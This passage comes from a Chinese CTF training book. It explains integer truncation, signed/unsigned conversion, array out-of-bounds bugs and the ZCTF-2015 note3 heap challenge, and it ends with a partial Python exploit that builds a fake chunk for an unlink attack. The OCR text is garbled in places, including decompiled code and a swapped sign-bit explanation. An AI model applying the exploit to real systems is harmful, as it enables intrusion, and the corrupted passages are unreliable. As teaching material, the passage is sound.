图15-5内存实际数据
程序实际执行结果如图15-6所示。
part_1（2):ffff
part_2（2):2
part_3（4):10001
part_4（2):1
图15-6执行结果
可以看出，part_1+part_4的结果为0x10001，存储到只有两字节
的par_4中时，前面的值会被舍弃，只留下后面两字节的数据
---
## Page 579
CTF特训营：技术详解、解题方法与
15.2符号转换
579/1144
15.2符号转换
符号转换主要是指有符号数与无符号数之间的转换，两者的主要
区别在于最高位是否代表符号。
无符号数相对比较简单，所有位数都用来表示数据位。
有符号数最高位代表符号（0代表正数、1代表负数），且有符号
数在内存中是以补码形式来存放的。具体如下：
1）数据的第一位为符号位。
2）正数的补码：与原码相同。
3）负数的补码：符号位为1，其余位为该数绝对值的原码按位
取反后再加1。
下面举例说明，如图15-7所示。
---
## Page 580
CTF特训营：技术详解、解题方法与
15.2符号转换
580/1144
无符号数：7
00
00
00
07
000000000000000000000000
00000111
无符号数：4275878552
FE
DC
BA
98
11111110110111001011101010011000
其中：4275878552=0xFEDCBA98
有符号数：7
00
00
00
07
00000000000000000000000000000111
符号位：1代表正数
有符号数：-19088744
FE
DC
BA
98
11111110110111001011101010011000
符号位：0代表负数
其中：0xFEDCBA98=~（1-190887441)+1
图15-7符号转换示意图
其中，对于有符号数-19088744，存储时的值为0xFEDCBA98，
计算过程具体如下。
1）-19088744的绝对值为19088744，存储为
00000001001000110100010101101000
2）其中第一位舍弃不看，其余位取反为
*1111110110111001011101010010111。
3）将2）中的结果+1，为*1111110110111001011101010011000。
---
## Page 581
CTF特训营：技术详解、解题方法与
15.2符号转换
581/1144
4)将3）中的结果补上符号位1，最终结果为
11111110110111001011101010011000，与图15-7中的内容一致。
有符号数若为正数，则与无符号数所表示的值是一致的；若为负
数，则与无符号数所表示的数值相差很大，这也是符号转换的问题所
在。
一般来说，符号转换容易在以下情况产生漏洞。
1）条件判断；将无符号数与有符号数进行强制转换后，数值相
差很大，从而绕过条件判断。
2）参数传递；有些函数（尤其是系统库函数）对参数有特定的
要求，但是使用时并没有严格按照参数的类型进行参数传递。
对于情况1，下面列举一个简单的例子，代码如下：
(eueubisunounnp
int tmp_v=arg
if(tmp_v>100)
{
arg=1;
else
{
arg =2;
}
---
## Page 582
CTF特训营：技术详解、解题方法与
15.2符号转换
582/1144
{
原本考虑的是无符号数arg大于100和小于等于100这两种情况：
大于100，将arg赋值为1；小于等于100，将arg赋值为2。但是在实际
运行中，代码进行符号转换赋值后，将超过0x80000000的数赋值给
tmp_v后，其值为负数，最终得到arg的值为2，与原本的想法不一
致。
对于情况2来说，很多库函数使用不当就会出现问题，如参数为
有符号数却使用无符号数作为参数，或者与之相反。
---
## Page 583
CTF特训营：技术详解、解题方法与
15.3数组越界
583/1144
15.3数组越界
这种漏洞主要是由于检查不严格造成的，如对数组内存的索引超
出了数组的预设范围，从而可以访问到其他数据。这种漏洞，在CTF
赛题中出现的次数比较多。一般来说，数组越界功能相对比较强大
如果显示数组内容，可以实现信息泄露；如果可以修改数组内容，可
以实现数据篡改。
数据访问的示意如图15-8所示。
索引
其他
012345678
其他
范围
图15-8数据访问示意图
正常访问时，索引值位于预设的范围之内，但是如果判断不严格
超出了边界，就会访问到其他部分的数据，从而达到泄露信息或者修
改数据的目的。
---
## Page 584
CTF特训营：技术详解、解题方法与
15.3数组越界
584/1144
下面举个简单的例子进行说明，代码如下：
#include
int test_func（unsigned intt_v1,unsigned intt_v2)
int i;
int index0, index1, index2;
int stack_val_1;
int stack_val2;
int array_info[20];
for (i = 0; i0x0
3:0104
0x19
oxcafe2333rfffffff
1d
arrav infol251
16:0128
rbp
xfffrf
arrav info[29]
(:
pop
rbp)
8:0144
19:6152
_ltbc_start_nain+245>
图15-10内存数据
由上图可见，内存中的数组是连续排放的一块内存，当输入的
index未落在其申请的空间范围内时，可以访问到栈上其他部分的数
据。
---
## Page 587
CTF特训营：技术详解、解题方法与
15.4真题解析
587/1144
15.4真题解析
本节只看一道题—{ZCTF-2015)note3（PWN300)。
该题的主要问题在edit中，如图15-11所示。
_int6k)((unsignee
F ( 1d - 7 *(((signed
if ( ptr )
glabal_content_size_6e2acs[id_t]:
:(_:yuaquos nau au1 yndui..isqnd
get buff kBaepp(global conten
ssa3sp3.)snd-(on00
lohalcur ptr6e2aca=glohalcon
puoRp(ptr) - puts("please input correct 1d."):
turn (signed intjptr:
图15-11note3程序edit功能的反编译代码
输入的id经过了一系列运算。在getlong函数中，通过调用atol函
数对id进行转换，当len>\n")
io.writeline("1")
io.readuntil("content:(less than 1024))n")
io.writeline(str(length_t))
io.readuntil("content:\n")
io.writeline(content_t)
def delete_note(io,idt):
io.readuntil("option--->>in")
io.writeline("4")
io.read_until("id of the note:n")
io.writeline(str(id_t))
def edit_note(io,idt,contentt）:
io.read_until("option--->>\n")
io.writeline("3")
io.read_until(id of the note:\n")
io.writeline(str(id_t）)
io.read_until("content:")
io.writeline(content_t)
def pwn(io):
new_note（io,0x80,aaaaaa)
new_note(io,0x80,bbbbbb)
new_note（io,0x80,'cccccc)
new_note（io,0x80,'dddddd)
new_note(io,0x80,eeeeee)
new_note（io,Ox80,fff)
new_note(io,0x80, /bin/sh;)
target_id=2
edit note(io,target id,‘111111)
#useful_code --- begin
#prepare args
arch bytes=8
heap_buff_size = 0x80
#node1_addr=&p0
node1_addr=0x6020C8+0x08*target_id
pack_fun=164
heap_node_size=heap_buff_size +2*arch_bytes #0x88
pO=pack_fun（Ox0)
p1=pack _fun（heap_buff_size +Ox01)
p2=pack_fun(node1_addr-3*arch_bytes)
p3=pack fun（node1_addr-2*arch_bytes)
#p[2]=p-3
#p[3]=p-2
#node1_addr=&node1_addr-3
---
## Page 591
CTF特训营：技术详解、解题方法与
15.4真题解析
591/1144
node2_pre_size=pack fun（heap_buff_size)
node2_size=pack_fun(heap_node_size)
data1=p0+p1+p2+p3+.just（heap_buff_size-4*arch_bytes,1)+node2
pre_size +node2_size